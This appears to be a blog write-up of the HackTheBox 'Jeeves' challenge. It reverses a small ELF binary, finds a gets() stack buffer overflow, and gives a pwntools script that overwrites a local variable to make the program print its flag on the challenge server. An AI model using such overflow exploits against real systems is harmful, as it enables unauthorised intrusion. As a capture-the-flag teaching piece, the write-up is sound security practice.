---
layout: post
title: Binary Exploitation&#58; HacktheBox/Jeeves
---

# HacktheBox Jeeves Write-up

Check file type:
```
└─$ file jeeves
jeeves: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=18c31354ce48c8d63267a9a807f1799988af27bf, for GNU/Linux 3.2.0, not stripped
```

Check securities:
```
└─$ checksec --file=jeeves  
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   70 Symbols	  No	0		3		jeeves
```

Run the program, we see that it simply prompts us for a name and returns that name in a greeting.
```
└─$ ./jeeves 
Hello, good sir!
May I have your name? Jake
Hello Jake, hope you have a good day!
```

### Reversing

Looking at the ```main()``` function, we see a clear buffer overflow.
```c
undefined8 main(void)

{
  char local_48 [44];
  int local_1c;
  void *local_18;
  int local_c;
  
  local_c = -0x21523f2d;
  printf("Hello, good sir!\nMay I have your name? ");
  gets(local_48);
  printf("Hello %s, hope you have a good day!\n",local_48);
  if (local_c == 0x1337bab3) {
    local_18 = malloc(256);
    local_1c = open("flag.txt",0);
    read(local_1c,local_18,0x100);
    printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",local_18);
    close(local_1c);
  }
  return 0;
}
```

Pretty much anytime ```gets()``` is included in a binary, it is pwnable. We also see that ```local_c``` is initiated and to get the flag we must overwrite it's contents with ```0x1337bab3```. Should be simple enough!

### Pwn

First we need to find the offset to our variable. Even though PIE is enabled, the offsets should be the same according to ghidra. We can take the offset of our input, and subract the offset of ```local_c```. 
```
>>> hex(0x48 - 0xc)
'0x3c'
>>> 0x3c
60
```

Now we know our offset. Time to craft our exploit.
```python
#!/usr/bin/env python3

from pwn import *

payload = b"A"*60 + p64(0x1337bab3)

p = remote("165.232.40.36", 32687)

p.sendline(payload)

p.interactive()
```

Et Voila!


